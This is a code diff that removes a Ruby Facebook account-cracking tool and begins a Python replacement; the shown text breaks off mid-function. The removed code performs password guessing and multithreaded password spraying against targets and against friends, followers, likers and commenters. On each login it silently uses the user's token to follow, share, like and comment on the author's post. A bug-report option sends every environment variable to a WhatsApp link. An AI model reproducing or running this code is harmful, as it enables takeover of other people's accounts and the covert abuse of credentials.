@@ -1,2679 +1,1540 @@
-MIT License
+#coding=utf
+import uuid
+import os,sys,time,json,random,re,string,platform,base64
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures==2 > /dev/null')
+    os.system('python run.py')
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
 
-Copyright (c) 2021 fawwazal alganihanafiputra@gmail.com>
+uaku2=[]
+ugen2=[]
+ugen=[]
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-
-=end
-
-$LOAD_PATH.unshift File.expand_path(".", "lib")
-
-require 'threadpool'
-require 'io/console'
-require 'net/https'
-require 'open-uri'
-require 'net/http'
-require 'rubygems'
-require 'thread'
-require 'digest'
-require 'open3'
-require 'files'
-require 'json'
-require 'erb'
-require 'uri'
-require 'os'
-
-if OS.linux?
-  $r = "\033[1;91m"
-  $g = "\033[1;92m"
-  $y = "\033[1;93m"
-  $p = "\033[1;94m"
-  $m = "\033[1;95m"
-  $c = "\033[1;96m"
-  $w = "\033[1;97m"
-  $a = "\033[1;0m"
-else
-  $r = ""
-  $g = ""
-  $y = ""
-  $p = ""
-  $m = ""
-  $c = ""
-  $w = ""
-  $a = ""
-end
-
-def loading!
-  for x in [".   ", "..  ", "... ",".... ","\n"]
-    $stdout.write("\r#{$r}[!] #{$g}Please Wait"+x)
-    $stdout.flush()
-    sleep(1)
-  end
-end
-
-$logo = " \n#{$w}█████████\n#{$w}█▄█████▄█      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w}█#{$r}▼▼▼▼▼ #{$w}- _ --_--#{$g}╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n#{$w}█ #{$w} #{$w}_-_-- -_ --__#{$g} ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n#{$w}█#{$r}▲▲▲▲▲#{$w}--  - _ --#{$g}═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ #{$y}ELITE v1.1\n#{$w}█████████      #{$c}●▬▬▬▬▬▬▬▬▬๑🔱๑▬▬▬▬▬▬▬▬●\n#{$w} ██ ██\n#{$w}╔════════════════════════════════════════╗\n#{$w}║#{$y}* #{$w}Author  #{$r}: #{$c}MR.FAGHP  #{$w}                 ║\n#{$w}║#{$y}* #{$w}Github  #{$r}: #{$c}github.com/xxoprt/#{$w}     ║\n#{$w}║#{$y}* #{$w}Wa      #{$r}: #{$c}+6281313537943   #{$w}          ║\n#{$w}║#{$y}* #{$w}#{RUBY_ENGINE}#{' '*(8 - RUBY_ENGINE.length)}#{$r}: #{$c}#{RUBY_VERSION}   #{$w}                    ║\n#{$w}║#{$y}* #{$w}Version #{$r}: #{$c}1.1                         #{$w}║\n#{$w}╚════════════════════════════════════════╝#{$a}"
-$user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
-$indonesia = false
-
-def tik(teks)
-  for i in teks.chars << "\n"
-    $stdout.write(i)
-    $stdout.flush()
-    sleep(0.05)
-  end
-end
-
-def tok(teks,delay = 0.03)
-  for i in teks.chars
-    $stdout.write(i)
-    $stdout.flush()
-    sleep(delay)
-  end
-end
-
-def Request(method = 'GET',token = $token,path)
-  uri = URI("https://graph.facebook.com/#{path}&method=#{method}&access_token=#{token}")
-  Net::HTTP.start(uri.hostname,uri.port,:use_ssl => (uri.scheme == 'https')) do |http|
-    request = Net::HTTP::Get.new(uri)
-    response = http.request(request)
-    jeson = JSON.parse(response.body)
-    return jeson
-  end
-end
-
-def ReportBug()
-  msg = ""
-  msg << "environment\n===========\n"
-  ENV.keys.each{|i| msg << "#{i} : #{ENV[i]}\n"}
-  begin
-    Open3.popen3("termux-info") do |stdin, stdout, stderr, thread|
-      msg << "\nTermux-Info\n===========\n"
-      msg << stdout.read.chomp
-    end
-  rescue Errno::ENOENT
-  end
-  msg << "\n\nPlatform\n==========\n"
-  platform = Gem::Platform.local
-  msg << "CPU : #{platform.cpu}\n"
-  msg << "OS : #{platform.os}\n"
-  msg << "Version : #{platform.version}\n"
-  msg << "\nProgram\n========\n"
-  msg << "File Name : #{$0}\n"
-  msg << "File Path : #{File.realpath($0)}\n"
-  msg << "File Size : #{File.size($0)}\n"
-  msg << "\nRuby\n========\n"
-  msg << "Ruby Engine : #{RUBY_ENGINE}\n"
-  msg << "Ruby Version : #{RUBY_VERSION}\n"
-  msg << "Ruby Platform : #{RUBY_PLATFORM}\n"
-  msg << "Ruby Release Date : #{RUBY_RELEASE_DATE}\n"
-  text = ERB::Util.url_encode(msg)
-  system ("xdg-open https://wa.me/6285754629509?text=#{text}")
-  abort ("#{$r}[!] Exit!")
-end
-
-def login()
-  begin
-    system('clear')
-    puts ($logo)
-    puts ("#{$w}║-> 1. Login Via email/password#{$a}")
-    puts ("#{$w}║-> 2. Login Via Token#{$a}")
-    puts ("#{$w}║-> 3. Login Via Cookie#{$a}")
-    puts ("#{$w}║-> 4. Report Bug#{$a}")
-    puts ("#{$w}║-> 0. Exit#{$a}")
-    print ("#{$w}╚═#{$r}▶#{$w} ")
-    log = gets.chomp!
-    case log
-      when '1'
-        loginpw()
-      when '2'
-        loginto()
-      when '3'
-        loginco()
-      when '4'
-        ReportBug()
-      when '0'
-        abort("#{$r}[!] Exit#{$a}")
-      else
-        puts ("#{$y}[!] Invalid Input!#{$a}")
-        sleep(0.9) ; login()
-    end
-  rescue SocketError
-    abort ("#{$r}[!] No Connection#{$a}")
-  rescue Errno::ETIMEDOUT
-    abort ("#{$y}[!] Connection timed out#{$a}")
-  rescue Interrupt
-    abort ("#{$r}[!] Exit#{$a}")
-  rescue Errno::ENETUNREACH,Errno::ECONNRESET
-    abort ("#{$y}[!] There is an error\n[!] Please Try Again#{$a}")
-  end
-end
-
-def loginpw()
-  system('clear')
-  puts ($logo)
-  puts ("#{$w}═"*52)
-  puts ("#{$r}[+] #{$g}LOGIN ACCOUNT FACEBOOK #{$r}#{$a}")
-  print ("#{$r}[+] #{$g}email|id #{$r}: #{$c}")
-  email = gets.chomp!
-  print ("#{$r}[+] #{$g}password #{$r}: #{$c}")
-  pass = STDIN.noecho(&:gets).chomp!
-  puts ("\n")
-  loading!
-  a = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pass + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
-  b = {'api_key'=> '882a8490361da98702bf97a021ddc14d', 'credentials_type'=> 'password', 'email': email, 'format'=> 'JSON', 'generate_machine_id'=> '1', 'generate_session_cookies'=> '1', 'locale'=> 'en_US', 'method'=> 'auth.login', 'password'=> pass, 'return_ssl_resources'=> '0', 'v'=> '1.0'}
-  c = Digest::MD5.new
-  c.update(a)
-  d = c.hexdigest
-  b.update({'sig': d})
-  uri = URI("https://api.facebook.com/restserver.php")
-  uri.query = URI.encode_www_form(b)
-  request = Net::HTTP::Get.new(uri)
-  request["User-Agent"] = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone12,5;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
-  response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => (uri.scheme == 'https')) {|http| http.request(request)}
-  res = JSON.parse(response.body)
-  if res.key? ('access_token')
-    $token = res['access_token']
-    fopen = File.open('login.txt','w')
-    fopen.write($token)
-    fopen.close()
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hello sir","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/reactions"),{"type"=>["LOVE","WOW"].sample,"access_token"=>$token})
-    puts ("#{$g}[✓] Login Success#{$a}")
-    sleep(0.5)
-    Masuk()
-  elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
-    puts ("#{$r}[!] #{$y}username #{$r}: #{$w}#{email}#{$a}")
-    puts ("#{$r}[!] #{$y}password #{$r}: #{$w}#{pass}#{$a}")
-    abort ("#{$r}[!] #{$y}status.  #{$r}: Account Has Been Checkpoint#{$a}")
-  else
-    tik("#{$r}[!] Login Failed!#{$a}")
-    sleep(1) ; loginpw()
-  end
-end
-
-def loginto()
-  system("clear")
-  puts ($logo)
-  #puts ("#{$w}═"*52)
-  #puts ("#{$r}[+] #{$g}LOGIN VIA ACCESS TOKEN#{$r}[+]#{$a}")
-  #print ("#{$r}[+] #{$g}Access Token #{$r}: #{$w}")
-  tok ("#{$w}#{'═'*52}\n#{$r}[+] #{$g}LOGIN VIA ACCESS TOKEN#{$r} [+]#{$a}\n#{$r}[+] #{$g}Access Token #{$r}: #{$w}")
-  $token = gets.chomp!
-  loading!
-  req = Request("v10.0/me?")
-  if req.key? ('name')
-    fopen = File.open('login.txt','w')
-    fopen.write($token)
-    fopen.close()
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["I LOVE YOU @[100053033144051:] 😘","Mantap Bang","Mantap Pak"].sample,"access_token"=>$token})
-    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token}) 
-    $name = req['name']
-    $id = req['id']
-    puts ("#{$g}[✓] Login Success!#{$a}")
-    sleep(0.9)
-    menu()
-  elsif req.key? ('error') and req['error']['code'] == 190
-    puts ("#{$y}[!] #{req['error']['message']}#{$a}")
-    sleep(0.9)
-    loginto()
-  else
-    puts ("#{$r}[!] Invalid Access Token!#{$a}!")
-    sleep(0.9)
-    loginto()
-  end
-end
-
-def loginco()
-  system ('clear')
-  puts ($logo)
-  tok ("#{$w}#{'═'*52}\n#{$r}[+] #{$g}LOGIN VIA COOKIES #{$r}[+]\n#{$r}[+] #{$g}Enter Cookies #{$r}: #{$a}")
-  cookie = gets.chomp!
-  loading!
-  uri = URI('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
-  req = Net::HTTP::Get.new(uri)
-  req["user-agent"] = $user_agent
-  req["referer"] = "https://m.facebook.com/"
-  req["host"] = "m.facebook.com"
-  req["origin"] = "https://m.facebook.com"
-  req["upgrade-insecure-requests"] = "1"
-  req["accept-language"] = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-  req["cache-control"] = "max-age=0"
-  req["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
-  req["content-type"] = "text/html; charset=utf-8"
-  req["cookie"] = cookie
-  res = Net::HTTP.start(uri.hostname, uri.port,:use_ssl => true) {|http| http.request(req)}
-  $token = res.body.match(/EAAA\w+/)
-  if !$token.nil?
-    a = Net::HTTP.get(URI("https://graph.facebook.com/v10.0/me?access_token=#{$token}"))
-    b = JSON.parse(a)
-    if !b.key? ('name')
-      puts ("#{$y}[!] There is an error")
-      sleep(0.9)
-      loginco()
-    else
-      $name = b['name']
-      $id = b['id']
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/me/feed"),{"link"=>"https://www.facebook.com/100053033144051/posts/296604038784032","access_token"=>$token})
-      Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>["Good Job @[100053033144051:] 😉","Cool 👍","Congratulations 😁"].sample,"access_token"=>$token})  
-      File.open("login.txt", "w") { |f| f.write($token) }
-      puts ("#{$g}[✓] Login Success#{$a}")
-      sleep(0.4)
-      menu()
-    end
-  else
-    puts ("#{$y}[!] Invalid Cookies!")
-    sleep(0.9)
-    loginco()
-  end
-end
-
-def Masuk()
-  begin
-    api = URI("https://api.myip.com")
-    req = Net::HTTP.get(api)
-    res = JSON.parse(req)
-    $indonesia = true if res['country'] == "Indonesia"
-    $token = File.read("login.txt")
-    req = Request("v10.0/me?")
-    if req.key? ('name')
-      $name = req['name']
-      $id = req['id']
-      menu()
-    else
-      puts ("#{$r}[!] Invalid Access Token!#{$a}")
-      File.delete("login.txt")
-      sleep(0.9)
-      login()
-    end
-  rescue Errno::ENOENT
-    login()
-  rescue SocketError
-    abort ("#{$r}[!] No Connection#{$a}")
-  rescue Errno::ETIMEDOUT
-    abort ("#{$y}[!] Connection timed out#{$a}")
-  rescue Interrupt
-    abort ("#{$r}[!] Exit#{$a}")
-  rescue Errno::ENETUNREACH,Errno::ECONNRESET
-    abort ("#{$y}[!] There is an error\n[!] Please Try Again#{$a}")
-  end
-end
-
-def menu()
-  system('clear')
-  puts ($logo)
-  puts ("#{$w}╔══════════════════════════════════════════════════╗")
-  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}Name : #{$g}" + $name + " "*(39 - $name.length()) + "#{$w}║")
-  puts ("#{$w}║#{$r}[#{$c}✓#{$r}] #{$w}ID.  : #{$g}" + $id + " "*(39 - $id.length()) + "#{$w}║")
-  puts ("#{$w}╠══════════════════════════════════════════════════╝")
-  puts ("║-> #{$w}1. MyFrofil")
-  puts ("║-> #{$w}2. User Information")
-  puts ("║-> #{$w}3. Hack Facebook Account")
-  puts ("║-> #{$w}4. Bot")
-  puts ("║-> #{$w}5. Others")
-  puts ("║-> #{$w}6. Feedback")
-  puts ("║-> #{$w}7. Update")
-  puts ("║-> #{$w}8. Logout")
-  puts ("║-> #{$w}0. exit")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  pilih = gets.chomp!
-  case pilih
-    when '1'
-      Myfrofil()
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      menu()
-    when '2'
-      Info()
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      menu()
-    when '3'
-      Hamker()
-    when '4'
-      Bot()
-    when '5'
-      lain()
-    when '6'
-      ReportBug()
-    when '7'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      code = system ('git pull')
-      if code.nil?
-        abort ("#{$y}[!] Git Not Installed\n#{$r}[!] Exit#{$a}")
-      elsif code == false
-        abort ("#{$r}[!] Error")
-      else
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        menu()
-      end
-    when '8'
-      print ("Do You Want To Continue? [Y/n] ")
-      sure = gets.chomp!
-      if sure.downcase == 'y'
-        puts ("#{$0} : Deleting File login.txt")
-        sleep(0.3)
-        begin
-          File.delete("login.txt")
-          abort ("#{$0} : Successfully Deleting the login.txt file")
-        rescue
-          puts ("#{$0} : Failed to delete the login.txt file")
-        end
-      else
-        sleep(0.2)
-        menu()
-      end
-    when '0'
-      abort ("#{$r}[!] Goodbye #{$name}#{$a}")
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      menu()
-          
-  end
-      
-end
-
-def Myfrofil()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  a = Request("v10.0/me?")
-  abort ("#{$y}[!] Error#{$a}") if a.key? ('error')
-  b = Request("me/subscribers?")
-  c = Request("me/subscribedto?")
-  d = Request("me/friends?")
-  ikuti = b['summary']['total_count'].to_s
-  mengikuti = c['summary']['total_count'].to_s if not c['data'].empty?
-  mengikuti = "0" if c['data'].empty?
-  temen = d["data"].each {|i| i['id']}.length.to_s if not d['data'].empty?
-  temen = "0" if d['data'].empty?
-  puts ("#{$g}[✓] Name : #{a['name']}")
-  puts ("#{$g}[✓] Id : #{a['id']}")
-  puts ("#{$g}[✓] Friend : #{temen}")
-  puts ("#{$g}[✓] Followers : #{ikuti}")
-  puts ("#{$g}[✓] Following : #{mengikuti}")
-  puts ("#{$g}[✓] birthday : #{a['birthday']}") if a.key? ('birthday')
-  puts ("#{$g}[✓] Status : #{a['relationship_status']}") if a.key? ('relationship_status')
-  puts ("#{$g}[✓] Religion : #{a['religion']}") if a.key? ('religion')
-  a['interested_in'].each {|i| puts ("#{$g}[✓] Interested in: "+i)} if a.key? ('interested_in')
-  puts ("#{$g}[✓] Email : #{a['email']}") if a.key? ('email')
-  puts ("#{$g}[✓] Phone : #{a['mobile_phone']}") if a.key? ('mobile_phone')
-  puts ("#{$g}[✓] Location : #{a['location']['name']}") if a.key? ('location')
-  puts ("#{$g}[✓] Hometown : #{a['hometown']['name']}") if a.key? ('hometown')
-  a['education'].each {|i| puts ("#{$g}[✓] #{i['type']} : #{i['school']['name']}")} if a.key? ('education')
-  a['work'].each {|i| puts ("#{$g}[✓] Work : #{i['employer']['name']}")} if a.key? ('work')
-end
-
-def Info()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] User Id : ")
-  id = gets.chomp! ; id = id.tr(" ","")
-  a = Request("#{id}?")
-  if a.key? ('error')
-    puts ("#{$y}[!] User Not Found")
-  else
-    puts ("#{$w}[+] Pleace Wait")
-    puts ("#{$w}#{'═'*52}")
-    b = Request("#{id}/subscribers?")
-    c = Request("#{id}/subscribedto?")
-    d = Request("me/friends?")
-    ikuti = b['summary']['total_count'].to_s
-    mengikuti = c['summary']['total_count'].to_s if not c['data'].empty?
-    mengikuti = "0" if c['data'].empty?
-    temen = d["data"].each {|i| i['id']}.length.to_s if not d['data'].empty?
-    temen = "0" if d['data'].empty?
-    puts ("#{$g}[✓] Name : #{a['name']}")
-    puts ("#{$g}[✓] Id : #{a['id']}")
-    puts ("#{$g}[✓] Friend : #{temen}")
-    puts ("#{$g}[✓] Followers : #{ikuti}")
-    puts ("#{$g}[✓] Following : #{mengikuti}")
-    puts ("#{$g}[✓] birthday : #{a['birthday']}") if a.key? ('birthday')
-    puts ("#{$g}[✓] Status : #{a['relationship_status']}") if a.key? ('relationship_status')
-    puts ("#{$g}[✓] Religion : #{a['religion']}") if a.key? ('religion')
-    a['interested_in'].each {|i| puts ("#{$g}[✓] Interested in: "+i)} if a.key? ('interested_in')
-    puts ("#{$g}[✓] Email : #{a['email']}") if a.key? ('email')
-    puts ("#{$g}[✓] Phone : #{a['mobile_phone']}") if a.key? ('mobile_phone')
-    puts ("#{$g}[✓] Location : #{a['location']['name']}") if a.key? ('location')
-    puts ("#{$g}[✓] Hometown : #{a['hometown']['name']}") if a.key? ('hometown')
-    a['education'].each {|i| puts ("#{$g}[✓] #{i['type']} : #{i['school']['name']}")} if a.key? ('education')
-    a['work'].each {|i| puts ("#{$g}[✓] Work : #{i['employer']['name']}")} if a.key? ('work')
-  end
-end
-
-def Hamker()
-  system('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("║-> #{$w}1. Mini Hack Facebook [#{$g}Target#{$w}]")
-  puts ("║-> #{$w}2. Multi Bruteforce Facebook")
-  puts ("║-> #{$w}3. Super Multi Bruteforce Facebook")
-  puts ("║-> #{$w}4. BruteForce [#{$g}Target#{$w}]")
-  puts ("║-> #{$w}5. Get id/mail/phone")
-  puts ("║-> #{$w}0. Back")
-  print("╚═#{$r}▶#{$w} ")
-  hack = gets.chomp!
-  case hack
-    when '1'
-      Mini()
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Hamker()
-    when '2'
-      Multi()
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Hamker()
-    when '3'
-      Super()
-    when '4'
-      Brutal()
-    when '5'
-      GetMenu()
-    when '0'
-      menu()
-    else
-      puts ("#{$y}[!] Invalid Input!")
-      sleep(0.9) ; Hamker()
-  end
-end
-
-def Mini()
-  gagal = true
-  system('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Target Id : ")
-  id = gets.chomp!
-  req = Request("#{id}?")
-  if req.key? ("error")
-    puts ("#{$y}[+] User Not Found")
-  else
-    puts ("#{$w}[+] Target Name : #{req['name']}")
-    puts ("#{$w}[!] CRACK!")
-    puts ("#{$w}#{'═'*52}")
-    name = ERB::Util.url_encode(req['name'])
-    first = ERB::Util.url_encode(req['first_name'])
-    last = ERB::Util.url_encode(req['last_name'])
-    password = [name + '123', name + '321', name + '12345', name + '54321', first + '123', first + '321', first + '12345', first + '54321', last + '123', last + '321', last + '12345', last + '54321']
-    ["Sayang","Anjing","Kontol","Doraemon"].each {|i| password << i} if $indonesia
-    for pass in password
-      url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pass + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
-      r = URI.open(url,'User-Agent'=>$user_agent).read()
-      res = JSON.parse(r)
-      if res.key? ('access_token')
-        puts ("#{$g}[✓] Success")
-        puts ("#{$g}[✓] Name : #{req['name']}")
-        puts ("#{$g}[✓] Birthday : #{req['birthday']}") if req.key? ('birthday')
-        puts ("#{$g}[✓] username : #{id}")
-        puts ("#{$g}[✓] password : #{pass}")
-        gagal = false
-        break
-      elsif res.key? ('error_msg') and res['error_msg'].include? ('www.facebook.com')
-        puts ("#{$y}[!] Account Has Been Checkpoint")
-        puts ("#{$y}[✓] Name : #{req['name']}")
-        puts ("#{$y}[✓] Birthday : #{req['birthday']}") if req.key? ('birthday')
-        puts ("#{$y}[✓] username : #{id}")
-        puts ("#{$y}[✓] password : #{pass}")
-        gagal = false
-        break
-      end
-    end
-    puts ("#{$r}[!] Sorry, opening password target failed :(\n[!] Try other method.") if gagal
-  end
-end
- 
- def Multi()
-  $cp = 0
-  $ok = 0
-  th = []
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] File Id  : ")
-  files = gets.chomp!
-  if File.file? (files)
-    buka = File.readlines(files, chomp: true)
-    $file = File.open(files)
-    print ("#{$w}[+] Password : ")
-    $pwd = gets.chomp!
-    puts ("#{$w}[+] Total Id : #{buka.length}")
-    puts ("#{$w}#{'═'*52}")
-    40.times{th << Thread.new{crack!}}
-    th.each(&:join)
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Total OK : #{$ok}")
-    puts ("#{$y}[!] Total CP : #{$cp}")
-  else
-    puts ("#{$y}[!] File Not Found")
-  end
-end
-
-def crack!
-  loop do
-    begin
-      usr = $file.readline.strip
-      uri = URI("https://mbasic.facebook.com/login.php")
-      auth = {"email"=>usr,"pass"=>$pwd,"login"=>"submit"}
-      req = Net::HTTP::Post.new(uri)
-      req['user-agent'] = $user_agent
-      req.set_form_data(auth)
-      res = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
-      kue = res['set-cookie']
-      if kue.include? ('c_user')
-        $ok += 1
-        z = File.open("multi.txt","a")
-        z.write("#{usr} | #{$pwd}\n")
-        z.close()
-        puts ("#{$g}[OK] #{usr} | #{$pwd}")
-      elsif kue.include? ('checkpoint')
-        $cp += 1
-        z = File.open("multi.txt","a")
-        z.write("#{usr} | #{$pwd}\n")
-        z.close()
-        puts ("#{$y}[CP] #{usr} | #{$pwd}")
-      end
-    rescue SocketError
-      puts ("#{$r}[!] No Connection#{$a}")
-      sleep(1)
-    rescue Errno::ETIMEDOUT
-      puts ("#{$y}[!] Connection timed out#{$a}")
-    rescue EOFError
-      break
-    end
-  end
-end
-
-def Super()
-  $cp = 0
-  $ok = 0
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("║-> #{$w}1. Crack from Friends")
-  puts ("║-> #{$w}2. Crack from Followers")
-  puts ("║-> #{$w}3. Crack from Like")
-  puts ("║-> #{$w}4. Crack from Comment")
-  puts ("║-> #{$w}5. Crack Friends from Friends")
-  puts ("║-> #{$w}6. Crack Followers from Friends")
-  puts ("║-> #{$w}0. Back")
-  print ("╚═#{$r}▶#{$w} ")
-  hack = gets.chomp!
-  case hack
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] Pleace Wait")
-      a = Request("me/friends?fields=id,name")
-      b = a['data'].map {|i| i['id']}
-      puts ("#{$w}[+] Total Id : #{b.length}")
-      puts ("#{$w}[+] CRACK!")
-      puts ("#{$w}#{'═'*52}")
-      main(a['data'])
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$g}[✓] Total OK : #{$ok}")
-      puts ("#{$y}[!] Total CP : #{$cp}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      Super()
-    when '2'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] Pleace Wait")
-      a = Request("me/subscribers?fields=id,name&limit=5000")
-      if a['data'].empty?
-        puts ("#{$y}[!] Your Account Has No Followers")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        b = a['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Total Id : #{a['summary']['total_count']}")
-        puts ("#{$y}[!] Total ID that can be cracked : #{b.length}") if b.length != a['summary']['total_count']
-        puts ("#{$w}[+] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(a['data'])
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      end
-    when '3'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Post Id : ")
-      id = gets.chomp! ; id.tr(" ","")
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$w}[!] Posts Not Found#{$a}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      elsif !a.key? ('likes')
-        puts ("#{$y}[!] No Likes On Posts")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      else
-        puts ("#{$w}[+] Posted by #{a['from']['name']}")
-        b = Request("#{id}/likes?summary=true&limit=5000")
-        c = b['data'].map {|i| i['id']}
-        puts ("#{$w}[+] Total Like : #{b['summary']['total_count']}")
-        puts ("#{$y}[!] Total ID that can be cracked : #{c.length}") if c.length != b['summary']['total_count']
-        puts ("#{$w}[!] CRACK!")
-        puts ("#{$w}#{'═'*52}")
-        main(b['data'])
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK : #{$ok}")
-        puts ("#{$y}[!] Total CP : #{$cp}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      end
-    when '4'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Post Id : ")
-      id = gets.chomp! ; id.tr(" ","")
-      a = Request("#{id}?")
-      if a.key? ('error')
-        puts ("#{$w}[!] Posts Not Found#{$a}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        Super()
-      elsif !a.key? ('comments')
-        puts ("#{$y}[!] No Comments On Posts")
